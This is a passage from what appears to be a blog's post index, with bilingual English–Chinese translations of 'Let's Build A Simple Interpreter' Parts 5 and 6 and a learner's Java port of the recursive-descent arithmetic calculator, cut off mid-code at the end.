Writing Compilers and Interpreters: A Software Engineering Approach 编写编译器和解释器: 一种软件工程方法 Modern Compiler Implementation in Java 现代编译器在 Java 中的实现 Modern Compiler Design 现代编译器设计 Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis 让我们建立一个简单的解释器。第13部分: 语义分析 Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler 让我们构建一个简单的解释器。第14部分: 嵌套作用域和源到源编译器 Let's Build A Simple Interpreter. Part 15. 让我们构建一个简单的解释器。第15部分 Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls 让我们建立一个简单的解释器。第16部分: 识别过程调用 Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records 让我们构建一个简单的解释器。第17部分: 调用堆栈和激活记录 Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls 让我们构建一个简单的解释器。第18部分: 执行过程调用 Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls 让我们构建一个简单的解释器。第19部分: 嵌套过程调用 ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part7-abstract-syntax-trees/"},{"title":"Let’s Build A Simple Interpreter. Part6. —— Java版本","content":"学到Part6，用Java重写了解释器。 把这几个类拆开放了，共三个文件： src ├── Interpreter.java ├── Lexer.java └── Token.java Token.java public class Token { private String type; private String value; public Token(String type, String value) { this.type = type; this.value = value; } public String getType() { return type; } public String getValue() { return value; } @Override public String toString() { return &quot;Token{&quot; + &quot;type='&quot; + type + '\\'' + &quot;, value='&quot; + value + '\\'' + '}'; } } Lexer.java （词法分析器） import com.sun.xml.internal.ws.api.message.ExceptionHasMessage; /** * 词法解析器：输入字符串-&gt;token */ public class Lexer{ private String text; private int pos=0; private char current_char; public Lexer(String text) { this.text = text; this.current_char = text.charAt(this.pos); } private void error() throws InvalidCharException{ throw new InvalidCharException(&quot;Invalid character&quot;); } /** * 字符串的解析前进一个字符 */ private void advance(){ this.pos += 1; if(this.pos &gt; this.text.length()-1){ this.current_char = '\\0'; }else{ this.current_char = this.text.charAt(pos); } } /** * 跳过空格 */ private void skip_whitespace(){ if(this.current_char!='\\0' &amp;&amp; Character.isSpaceChar(this.current_char)){ advance(); } } /** * 一/多个字符-&gt;整数 * @return */ private String integer(){ String result = &quot;&quot;; while(this.current_char != '\\0' &amp;&amp; Character.isDigit(this.current_char)){ result += this.current_char; advance(); } return result; } /** * 获取下一个token，并且使得pos加一 * @return */ public Token get_next_token() throws InvalidCharException { while(this.current_char != '\\0' ){ // 判断当前字符是空格 if(Character.isSpaceChar(this.current_char)){ //跳过空格 skip_whitespace(); //然后继续循环 continue; }else if(Character.isDigit(this.current_char)){ // 如果当前字符是整数 return new Token(Interpreter.INTEGER,integer()); }else if(this.current_char == '+'){// 如果当前字符是+ // 前进一步 advance(); //然后返回当前字符对应的token return new Token(Interpreter.PLUS,&quot;+&quot;); }else if(this.current_char == '-'){// 如果当前字符是- // 前进一步 advance(); //然后返回当前字符对应的token return new Token(Interpreter.MINUS,&quot;-&quot;); }else if(this.current_char == '*'){// 如果当前字符是* // 前进一步 advance(); //然后返回当前字符对应的token return new Token(Interpreter.MUL,&quot;*&quot;); }else if(this.current_char == '/'){// 如果当前字符是/ // 前进一步 advance(); //然后返回当前字符对应的token return new Token(Interpreter.DIV,&quot;/&quot;); }else if(this.current_char == '('){// 如果当前字符是( // 前进一步 advance(); //然后返回当前字符对应的token return new Token(Interpreter.LPAREN,&quot;(&quot;); }else if(this.current_char == ')'){// 如果当前字符是) // 前进一步 advance(); //然后返回当前字符对应的token return new Token(Interpreter.RPAREN,&quot;)&quot;); }else{ error(); } } return new Token(Interpreter.EOF,&quot;EOF&quot;); } public class InvalidCharException extends Exception{ public InvalidCharException(String message) { super(message); } } } Interpreter.java（语法分析器和解释器） import java.util.Scanner; public class Interpreter { // expr : term ((PLUS | MINUS)term)* // term : factor ((MUL|DIV)factor)* // factor : INTEGER | LPAREN expr RPAREN private Lexer lexer; private Token current_token; public final static String PLUS = &quot;PLUS&quot;; public final static String MINUS = &quot;MINUS&quot;; public final static String MUL = &quot;MUL&quot;; public final static String DIV = &quot;DIV&quot;; public final static String LPAREN = &quot;(&quot;; public final static String RPAREN = &quot;)&quot;; public final static String INTEGER = &quot;INTEGER&quot;; public final static String EOF = &quot;EOF&quot;; public Interpreter(Lexer lexer) throws Lexer.InvalidCharException { this.lexer = lexer; this.current_token = lexer.get_next_token(); } /** * 抛出语法异常 * @throws InvalidSyntaxException */ public void error() throws InvalidSyntaxException { throw new InvalidSyntaxException(&quot;Invalid syntax&quot;); } public class InvalidSyntaxException extends Exception{ public InvalidSyntaxException(String message) { super(message); } } private void eat(String token_type) throws InvalidSyntaxException, Lexer.InvalidCharException { // 如果当前token的type和传入的type确实一样，那么就获取下一个token if(this.current_token.getType() == token_type){ this.current_token = this.lexer.get_next_token(); }else{ throw new InvalidSyntaxException(&quot;Invalid Syntax&quot;); } } /** * factor : INTEGER | LPAREN expr RPAREN * @return 基本单元 */ private int factor() throws InvalidSyntaxException, Lexer.InvalidCharException { int result=0; if(this.current_token.getType() == INTEGER){ // 需要先取出当前INTEGER类型的token，否则下面eat之后的return返回的就是INTEGER的下一个token了 Token token = this.current_token; eat(INTEGER); result = Integer.valueOf(token.getValue()); }else if(this.current_token.getType() == LPAREN){ eat(LPAREN); result = expr(); eat(RPAREN); } return result; } /** * term : factor ((MUL|DIV)factor)* * @return 中间计算结果 */ private int term() throws InvalidSyntaxException, Lexer.InvalidCharException { // 获取第一个factor int result = factor(); // ()* -&gt; 循环 while(this.current_token.getType() == MUL || this.current_token.getType() == DIV){ // | -&gt; if-else if(this.current_token.getType() == MUL){ eat(MUL); result *= factor(); }else if(this.current_token.getType() == DIV){ eat(DIV); result /= factor(); } } return result; } // /** * expr : term ((PLUS | MINUS)term)* * * calc&gt; 7 + 3 * (10 / (12 / (3 + 1) - 1)) * 22 * * @return 最终计算结果 */ private int expr() throws InvalidSyntaxException, Lexer.InvalidCharException { // 获取第一个term int result = term(); // ()* -&gt; 循环 while(this.current_token.getType() == PLUS || this.current_token.getType() == MINUS){ // | -&gt; if-else if(this.current_token.getType() == PLUS){ // 吃掉当前token，设置this.current_token为下一个token eat(PLUS); // 加上第2个term result += term(); }else if(this.current_token.getType() == MINUS){ // 吃掉当前token，设置this.current_token为下一个token eat(MINUS); // 减去第2个term result -= term(); } } return result; } public static void main(String[] args) throws Lexer.InvalidCharException, InvalidSyntaxException { Scanner sc = new Scanner(System.in); while(true){ String text = &quot;&quot;; try{ System.out.print(&quot;calc&gt; &quot;); text = sc.nextLine(); }catch (Exception e){ break; } if(text.equals(&quot;&quot;)){ continue; } if(text.equals(&quot;exit&quot;)){ break; } // 将输入字符串转换为token Lexer lexer = new Lexer(text); // 将lexer输入解释器，new一个解释器 Interpreter interpreter = new Interpreter(lexer); //执行解释器的expr，得到结果 int result = interpreter.expr(); // 打印结果 System.out.println(result); } sc.close(); } } 测试 calc&gt; 7 + 3 * (10 / (12 / (3 + 1) - 1)) 22 calc&gt; calc&gt; 2 2 calc&gt; ","link":"https://lzxzl.github.io/post/lets-build-a-simple-interpreter-part6-java-ban-ben/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part6.","content":"Today is the day 😃 “Why?” you might ask. The reason is that today we’re wrapping up our discussion of arithmetic expressions (well, almost) by adding parenthesized expressions to our grammar and implementing an interpreter that will be able to evaluate parenthesized expressions with arbitrarily deep nesting, like the expression 7 + 3 * (10 / (12 / (3 + 1) - 1)). 今天就是这个日子:)“为什么?”你可能会问。原因是，今天我们结束了对算术表达式(嗯，几乎)的讨论，我们在grammar中添加了括号表达式，并实现了一个解释器，它可以用任意深度的嵌套对括号表达式求值，比如表达式7 + 3 * (10/(12/(3 + 1)-1))。 Let’s get started, shall we? 我们开始吧？ First, let’s modify the grammar to support expressions inside parentheses. As you remember from Part 5, the factor rule is used for basic units in expressions. In that article, the only basic unit we had was an integer. Today we’re adding another basic unit - a parenthesized expression. Let’s do it. 首先，让我们修改grammar以支持括号内的表达式。正如你在第5部分中所记得的，factor 规则用于表达式中的基本单位。在那篇文章中，我们唯一的基本单位是一个整数。今天我们要添加另一个基本单元——括号表达式。我们开始吧。 Here is our updated grammar: 下面是我们最新的grammar: The expr and the term productions are exactly the same as in Part 5 and the only change is in the factor production where the terminal LPAREN represents a left parenthesis ‘(‘, the terminal RPAREN represents a right parenthesis ‘)’, and the non-terminal expr between the parentheses refers to the expr rule. Expr 和 term 两个产生式与第5部分中的完全相同，唯一的变化是factor 产生式，其中终结符 LPAREN 表示左括号“(”，终结符 RPAREN 表示右括号‘)’，括号之间的非终结符 expr 表示 expr 产生式。 Here is the updated syntax diagram for the factor, which now includes alternatives: 下面是更新后的factor的syntax图，现在包含了其他选项: Because the grammar rules for the expr and the term haven’t changed, their syntax diagrams look the same as in Part 5: 因为 expr 和 term 的grammar规则没有改变，它们的syntax图看起来和第5部分一样: Here is an interesting feature of our new grammar - it is recursive. If you try to derive the expression 2 * (7 + 3), you will start with the expr start symbol and eventually you will get to a point where you will recursively use the expr rule again to derive the (7 + 3) portion of the original arithmetic expression. 这是我们新grammar的一个有趣的特点——它是递归的。如果您尝试派生表达式2 * (7 + 3) ，那么您将从 expr 起始符号开始，最终您将到达一个点，会再次递归地使用 expr 规则派生原始算术表达式的(7 + 3)部分。 Let’s decompose the expression 2 * (7 + 3) according to the grammar and see how it looks: 让我们根据grammar分解表达式2 * (7 + 3) ，看看它是什么样的: A little aside: if you need a refresher on recursion, take a look at Daniel P. Friedman and Matthias Felleisen’s The Little Schemer book - it’s really good. 顺便说一句: 如果你需要复习一下递归，可以看一下Daniel P. Friedman和 Matthias Felleisen 的《The Little Schemer》-这本书真的很不错。 Okay, let’s get moving and translate our new updated grammar to code. 好了，让我们开始吧，把新更新的grammar翻译成代码。 The following are the main changes to the code from the previous article: 以下是对上一篇文章代码的主要修改: The Lexer has been modified to return two more tokens: LPAREN for a left parenthesis and RPAREN for a right parenthesis. 对Lexer进行了修改，以返回另外两个标记:LPAREN(左括号)和RPAREN(右括号)。 The Interpreter‘s factor method has been slightly updated to parse parenthesized expressions in addition to integers. 解释器的factor方法略有更新，除了解析整数外，还可以解析圆括号表达式。 Here is the complete code of a calculator that can evaluate arithmetic expressions containing integers; any number of addition, subtraction, multiplication and division operators; and parenthesized expressions with arbitrarily deep nesting: 下面是一个计算器的完整代码，它可以计算包含整数的算术表达式; 任意数量的加、减、乘、除运算符; 以及任意深度嵌套的括号表达式: # Token types # # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, PLUS, MINUS, MUL, DIV, LPAREN, RPAREN, EOF = ( 'INTEGER', 'PLUS', 'MINUS', 'MUL', 'DIV', '(', ')', 'EOF' ) class Token(object): def __init__(self, type, value): self.type = type self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(PLUS, '+') Token(MUL, '*') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Lexer(object): def __init__(self, text): # client string input, e.g. &quot;4 + 2 * 3 - 6 / 2&quot; self.text = text # self.pos is an index into self.text self.pos = 0 self.current_char = self.text[self.pos] def error(self): raise Exception('Invalid character') def advance(self): &quot;&quot;&quot;Advance the `pos` pointer and set the `current_char` variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. One token at a time. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return Token(PLUS, '+') if self.current_char == '-': self.advance() return Token(MINUS, '-') if self.current_char == '*': self.advance() return Token(MUL, '*') if self.current_char == '/': self.advance() return Token(DIV, '/') if self.current_char == '(': self.advance() return Token(LPAREN, '(') if self.current_char == ')': self.advance() return Token(RPAREN, ')') self.error() return Token(EOF, None) class Interpreter(object): def __init__(self, lexer): self.lexer = lexer # set current token to the first token taken from the input self.current_token = self.lexer.get_next_token() def error(self): raise Exception('Invalid syntax') def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.lexer.get_next_token() else: self.error() def factor(self): &quot;&quot;&quot;factor : INTEGER | LPAREN expr RPAREN&quot;&quot;&quot; token = self.current_token if token.type == INTEGER: self.eat(INTEGER) return token.value elif token.type == LPAREN: self.eat(LPAREN) result = self.expr() self.eat(RPAREN) return result def term(self): &quot;&quot;&quot;term : factor ((MUL | DIV) factor)*&quot;&quot;&quot; result = self.factor() while self.current_token.type in (MUL, DIV): token = self.current_token if token.type == MUL: self.eat(MUL) result = result * self.factor() elif token.type == DIV: self.eat(DIV) result = result // self.factor() return result def expr(self): &quot;&quot;&quot;Arithmetic expression parser / interpreter. calc&gt; 7 + 3 * (10 / (12 / (3 + 1) - 1)) 22 expr : term ((PLUS | MINUS) term)* term : factor ((MUL | DIV) factor)* factor : INTEGER | LPAREN expr RPAREN &quot;&quot;&quot; result = self.term() while self.current_token.type in (PLUS, MINUS): token = self.current_token if token.type == PLUS: self.eat(PLUS) result = result + self.term() elif token.type == MINUS: self.eat(MINUS) result = result - self.term() return result def main(): while True: try: text = input('calc&gt; ') except EOFError: break if not text: continue lexer = Lexer(text) interpreter = Interpreter(lexer) result = interpreter.expr() print(result) if __name__ == '__main__': main() Save the above code into the calc6.py file, try it out and see for yourself that your new interpreter properly evaluates arithmetic expressions that have different operators and parentheses. 将上面的代码保存到 calc6.py 文件中，尝试一下，看看你的新解释器能否正确地计算具有不同运算符和括号的算术表达式。 Here is a sample session: 下面是一个例子: $ python calc6.py calc&gt; 3 3 calc&gt; 2 + 7 * 4 30 calc&gt; 7 - 8 / 4 5 calc&gt; 14 + 2 * 3 - 6 / 2 17 calc&gt; 7 + 3 * (10 / (12 / (3 + 1) - 1)) 22 calc&gt; 7 + 3 * (10 / (12 / (3 + 1) - 1)) / (2 + 3) - 5 - 3 + (8) 10 calc&gt; 7 + (((3 + 2))) 12 And here is a new exercise for you for today: 下面是今天的一个新练习: Write your own version of the interpreter of arithmetic expressions as described in this article. Remember: repetition is the mother of all learning. 如本文所述，编写你自己版本的算术表达式解释器。记住: 重复是学习之母。 Hey, you read all the way to the end! Congratulations, you’ve just learned how to create (and if you’ve done the exercise - you’ve actually written) a basic recursive-descent parser / interpreter that can evaluate pretty complex arithmetic expressions. 嘿，你从头读到尾了！恭喜你，你刚刚学会了如何创建一个基本的递归下降解析器/解释器(如果你已经完成了这个练习的话——你实际上已经编写了) ，它可以计算非常复杂的算术表达式。 In the next article I will talk in a lot more detail about recursive-descent parsers. I will also introduce an important and widely used data structure in interpreter and compiler construction that we’ll use throughout the series. 在下一篇文章中，我将更详细地讨论递归下降解析器。我还将介绍一种在解释器和编译器构造中广泛使用的重要数据结构，我们将在整个系列中使用这种结构。 Stay tuned and see you soon. Until then, keep working on your interpreter and most importantly: have fun and enjoy the process! 请继续关注，回头见。在那之前，继续为你的解释器工作，最重要的是: 享受这个过程！ Here is a list of books I recommend that will help you in your study of interpreters and compilers: 下面是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) Writing Compilers and Interpreters: A Software Engineering Approach 编写编译器和解释器: 一种软件工程方法 Modern Compiler Implementation in Java 现代编译器在 Java 中的实现 Modern Compiler Design 现代编译器设计 Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) All articles in this series: Let's Build A Simple Interpreter. Part 1. Let's Build A Simple Interpreter. Part 2. Let's Build A Simple Interpreter. Part 3. Let's Build A Simple Interpreter. Part 4. Let's Build A Simple Interpreter. Part 5. Let's Build A Simple Interpreter. Part 6. Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees Let's Build A Simple Interpreter. Part 8. Let's Build A Simple Interpreter. Part 9. Let's Build A Simple Interpreter. Part 10. Let's Build A Simple Interpreter. Part 11. Let's Build A Simple Interpreter. Part 12. Let's Build A Simple Interpreter. Part 13: Semantic Analysis Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler Let's Build A Simple Interpreter. Part 15. Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part6/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part5.","content":"How do you tackle something as complex as understanding how to create an interpreter or compiler? In the beginning it all looks pretty much like a tangled mess of yarn that you need to untangle to get that perfect ball. 如何处理像理解如何创建解释器或编译器这样复杂的事情？一开始，它看起来就像一团纠结的纱线，你需要解开它才能得到那个完美的球。 The way to get there is to just untangle it one thread, one knot at a time. Sometimes, though, you might feel like you don’t understand something right away, but you have to keep going. It will eventually “click” if you’re persistent enough, I promise you (Gee, if I put aside 25 cents every time I didn’t understand something right away I would have become rich a long time ago 😃. 到达那里的方法只是解开它的一根线，一次一个结。但有时候，你可能会觉得自己不能马上理解某些事情，但是你必须继续前进。如果你足够坚持，它最终会豁然开朗（click有豁然开朗，突然明白的意思～），我向你保证(哎呀，如果我每次不明白一件事情就存25美分，我早就发财了:)。 Probably one of the best pieces of advice I could give you on your way to understanding how to create an interpreter and compiler is to read the explanations in the articles, read the code, and then write code yourself, and even write the same code several times over a period of time to make the material and code feel natural to you, and only then move on to learn new topics. Do not rush, just slow down and take your time to understand the basic ideas deeply. This approach, while seemingly slow, will pay off down the road. Trust me. 也许在你理解如何创建解释器和编译器的过程中，我能给你的最好的建议之一就是阅读文章中的解释，阅读代码，然后自己编写代码，甚至在一段时间内多次编写相同的代码，使材料和代码对你来说感觉自然，然后再继续学习新的主题。不要匆忙，只是放慢速度，花时间深入理解基本思想。这种方法虽然看似缓慢，但最终会得到回报。相信我。 You will eventually get your perfect ball of yarn in the end. And, you know what? Even if it is not that perfect it is still better than the alternative, which is to do nothing and not learn the topic or quickly skim over it and forget it in a couple of days. 最终你会得到一个完美的线团。你知道吗？即使它不是那么完美，也比另一种选择要好，那就是什么都不做，不学习主题，或者快速浏览一下，几天后就忘记了。 Remember - just keep untangling: one thread, one knot at a time and practice what you’ve learned by writing code, a lot of it: 记住——只要保持理顺: 一条线，一次一个结，通过编写代码来练习你所学到的东西，很多: Today you’re going to use all the knowledge you’ve gained from previous articles in the series and learn how to parse and interpret arithmetic expressions that have any number of addition, subtraction, multiplication, and division operators. You will write an interpreter that will be able to evaluate expressions like “14 + 2 * 3 - 6 / 2”. 今天，你将使用从本系列前几篇文章中获得的所有知识，并学习如何解析和解释任意数量的加、减、乘和除运算符的算术表达式。你将编写一个能够计算像“14 + 2 * 3-6/2”这样的表达式的解释器。 Before diving in and writing some code let’s talk about the associativity and precedence of operators. 在深入编写一些代码之前，让我们先讨论一下操作符的结合性和优先级。 By convention 7 + 3 + 1 is the same as (7 + 3) + 1 and 7 - 3 - 1 is equivalent to (7 - 3) - 1. No surprises here. We all learned that at some point and have been taking it for granted since then. If we treated 7 - 3 - 1 as 7 - (3 - 1) the result would be unexpected 5 instead of the expected 3. 根据约定，7 + 3 + 1等于(7 + 3) + 1,7-3-1等于(7-3)-1。这里没有惊喜。我们都在某个时刻学到了这一点，并且从那时起就一直认为这是理所当然的。如果我们把7-3-1当作7-(3-1) ，结果将是意外的5，而不是预期的3。 In ordinary arithmetic and most programming languages addition, subtraction, multiplication, and division are left-associative: 在普通算术和大多数编程语言中，加、减、乘、除都是左结合的: 7 + 3 + 1 is equivalent to (7 + 3) + 1 7 - 3 - 1 is equivalent to (7 - 3) - 1 8 * 4 * 2 is equivalent to (8 * 4) * 2 8 / 4 / 2 is equivalent to (8 / 4) / 2 What does it mean for an operator to be left-associative? 一个操作符是左结合的，这意味着什么？ When an operand like 3 in the expression 7 + 3 + 1 has plus signs on both sides, we need a convention to decide which operator applies to 3. Is it the one to the left or the one to the right of the operand 3? The operator + associates to the left because an operand that has plus signs on both sides belongs to the operator to its left and so we say that the operator + is left-associative. That’s why 7 + 3 + 1 is equivalent to (7 + 3) + 1 by the associativity convention. 当表达式7 + 3 + 1中类似于3的操作数两边都有加号时，我们需要一个约定来决定哪个运算符应用于3。是操作数3左边的那个还是右边的那个？运算符 + 关联到左边，因为两边都有加号的操作数属于左边的运算符，所以我们说运算符 + 是左关联的。这就是为什么7 + 3 + 1等价于(7 + 3) + 1的结合性约定。 Okay, what about an expression like 7 + 5 * 2 where we have different kinds of operators on both sides of the operand 5? Is the expression equivalent to 7 + (5 * 2) or (7 + 5) * 2? How do we resolve this ambiguity? 好的，对于像7 + 5 * 2这样的表达式，操作数5的两边都有不同类型的运算符怎么办？表达式是否等价于7 + (5 * 2)或(7 + 5) * 2？我们如何解决这个模棱两可的问题？ In this case, the associativity convention is of no help to us because it applies only to operators of one kind, either additive (+, -) or multiplicative (*, /). We need another convention to resolve the ambiguity when we have different kinds of operators in the same expression. We need a convention that defines relative precedence of operators. 在这种情况下，结合性约定对我们没有帮助，因为它只适用于一种操作符，加法(+ ，-)或乘法(* ,/)。当同一表达式中有不同类型的运算符时，需要另一个约定来解决这种歧义。我们需要一个约定来定义运算符的相对优先级。 And here it is: we say that if the operator * takes its operands before + does, then it has higher precedence. In the arithmetic that we know and use, multiplication and division have higher precedence than addition and subtraction. As a result the expression 7 + 5 * 2 is equivalent to 7 + (5 * 2) and the expression 7 - 8 / 4 is equivalent to 7 - (8 / 4). 这就是: 我们说如果运算符 * 在 + 之前取得了它的操作数，那么它的优先级就更高。在我们所熟悉和使用的算术中，乘除法的优先级高于加减法。结果表达式7 + 5 * 2等价于7 + (5 * 2) ，表达式7-8/4等价于7-(8/4)。 In a case where we have an expression with operators that have the same precedence, we just use the associativity convention and execute the operators from left to right: 如果我们有一个具有相同优先级的操作符的表达式，我们只需要使用结合性约定并从左到右执行操作符: 7 + 3 - 1 is equivalent to (7 + 3) - 1 8 / 4 * 2 is equivalent to (8 / 4) * 2 I hope you didn’t think I wanted to bore you to death by talking so much about the associativity and precedence of operators. The nice thing about those conventions is that we can construct a grammar for arithmetic expressions from a table that shows the associativity and precedence of arithmetic operators. Then, we can translate the grammar into code by following the guidelines I outlined in Part 4, and our interpreter will be able to handle the precedence of operators in addition to associativity. 我希望你们不会认为我想通过过多地谈论操作符的结合律和优先级来让你们感到厌烦。这些约定的好处是，我们可以从一个表中为算术表达式构造一种grammar，它显示了算术运算符的结合性和优先级。然后，我们可以按照第4部分中概述的准则将grammar转换为代码，我们的解释器将能够处理除了结合性之外的操作符的优先级。 Okay, here is our precedence table: 好的，这是我们的优先级表: From the table, you can tell that operators + and - have the same precedence level and they are both left-associative. You can also see that operators * and / are also left-associative, have the same precedence among themselves but have higher-precedence than addition and subtraction operators. 从表中可以看出，运算符 + 和-具有相同的优先级，它们都是左关联的。还可以看到运算符 * 和/也是左关联的，它们之间的优先级相同，但是比加减运算符的优先级高。 Here are the rules for how to construct a grammar from the precedence table: 以下是如何从优先表构造grammar的规则: For each level of precedence define a non-terminal. The body of a production for the non-terminal should contain arithmetic operators from that level and non-terminals for the next higher level of precedence. 对于每个优先级，定义一个非终结符。非终结符的产生式应该包含该级别的算术运算符和下一个更高优先级的非终结符 Create an additional non-terminal factor for basic units of expression, in our case, integers. The general rule is that if you have N levels of precedence, you will need N + 1 non-terminals in total: one non-terminal for each level plus one non-terminal for basic units of expression. 为基本的表达式单位（在我们的例子中是整数）创建一个额外的非终结factor。一般的规则是，如果你有N个优先级，你将总共需要N + 1个非终结符：每个层次一个非终结符加上一个基本表达式单元的非终结符。 Onward! 前进！ Let’s follow the rules and construct our grammar. 让我们按照规则来构建我们的grammar。 According to Rule 1 we will define two non-terminals: a non-terminal called expr for level 2 and a non-terminal called term for level 1. And by following Rule 2 we will define a factor non-terminal for basic units of arithmetic expressions, integers. 根据规则1，我们将定义两个非终结符: 一个用于第2级的称为 expr 的非终结符，一个用于第1级的称为term的非终结符。通过遵循规则2，我们将为算术表达式的基本单位，即整数，定义一个factor非终结符。 The start symbol of our new grammar will be expr and the expr production will contain a body representing the use of operators from level 2, which in our case are operators + and - , and will contain term non-terminals for the next higher level of precedence, level 1: 新grammar的起始符号是 expr，expr 产生式将包含一个body，表示来自第2级的运算符的使用，在我们的例子中是运算符 + 和-，并且将包含下一个更高级别优先级1的非终结符: The term production will have a body representing the use of operators from level 1, which are operators * and / , and it will contain the non-terminal factor for the basic units of expression, integers: term产生式将有一个body，代表第1级操作符的使用，这些操作符是操作符 * 和/，它将包含表达式基本单位的非终结factor，即整数: And the production for the non-terminal factor will be: 非终结factor的产生式是: You’ve already seen above productions as part of grammars and syntax diagrams from previous articles, but here we combine them into one grammar that takes care of the associativity and the precedence of operators: 你已经在以前文章的grammar和syntax图表中看到过上面的结果，但是在这里我们把它们组合成一种grammar，这种grammar考虑了结合性和操作符的优先级: Here is a syntax diagram that corresponds to the grammar above: 下面是一个与上面的grammar相对应的syntax图: Each rectangular box in the diagram is a “method call” to another diagram. If you take the expression 7 + 5 * 2 and start with the top diagram expr and walk your way down to the bottommost diagram factor, you should be able to see that higher-precedence operators * and / in the lower diagram execute before operators + and - in the higher diagram. 图中的每个矩形框都是对另一个图的“方法调用”。如果使用表达式7 + 5 * 2并从顶部图 expr 开始，然后一直向下到最底部的图factor，那么应该能够看到在较高的图中，较高优先级的运算符 * 和/在较低的图中，在运算符 + 和-之前执行。 To drive the precedence of operators point home, let’s take a look at the decomposition of the same arithmetic expression 7 + 5 * 2 done in accordance with our grammar and syntax diagrams above. This is just another way to show that higher-precedence operators execute before operators with lower precedence: 为了使运算符的优先级更明确，让我们看一下根据上面的grammar和syntax图对同一个算术表达式7 + 5 * 2进行的分解。这只是显示高优先级运算符先于低优先级运算符执行的另一种方式: Okay, let’s convert the grammar to code following guidelines from Part 4 and see how our new interpreter works, shall we? 好的，让我们按照第4部分中的指导方针将grammar转换为代码，看看我们的新解释器是如何工作的，好吗？ Here is the grammar again: 这里再次提到grammar: And here is the complete code of a calculator that can handle valid arithmetic expressions containing integers and any number of addition, subtraction, multiplication, and division operators. 下面是一个计算器的完整代码，它可以处理包含整数和任意数量的加、减、乘、除运算符的有效算术表达式。 The following are the main changes compared with the code from Part 4: 以下是与第4部分代码相比的主要变化: The Lexer class can now tokenize +, -, *, and / (Nothing new here, we just combined code from previous articles into one class that supports all those tokens) Lexer类现在可以标记+、-、*和/（这里没有什么新内容，我们只是将前几篇文章中的代码组合成一个支持所有这些标记的类） Recall that each rule (production), R, defined in the grammar, becomes a method with the same name, and references to that rule become a method call: R(). As a result the Interpreter class now has three methods that correspond to non-terminals in the grammar: expr, term, and factor. 回想一下，grammar中定义的每个规则（产生式）R变成了同名的方法，而对该规则的引用变成了方法调用R()。因此，Interpreter类现在有三个方法对应语法中的非终结符：expr、term和factor。 Source code: 源代码: # Token types # # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, PLUS, MINUS, MUL, DIV, EOF = ( 'INTEGER', 'PLUS', 'MINUS', 'MUL', 'DIV', 'EOF' ) class Token(object): def __init__(self, type, value): # token type: INTEGER, PLUS, MINUS, MUL, DIV, or EOF self.type = type # token value: non-negative integer value, '+', '-', '*', '/', or None self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(PLUS, '+') Token(MUL, '*') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Lexer(object): def __init__(self, text): # client string input, e.g. &quot;3 * 5&quot;, &quot;12 / 3 * 4&quot;, etc self.text = text # self.pos is an index into self.text self.pos = 0 self.current_char = self.text[self.pos] def error(self): raise Exception('Invalid character') def advance(self): &quot;&quot;&quot;Advance the `pos` pointer and set the `current_char` variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def 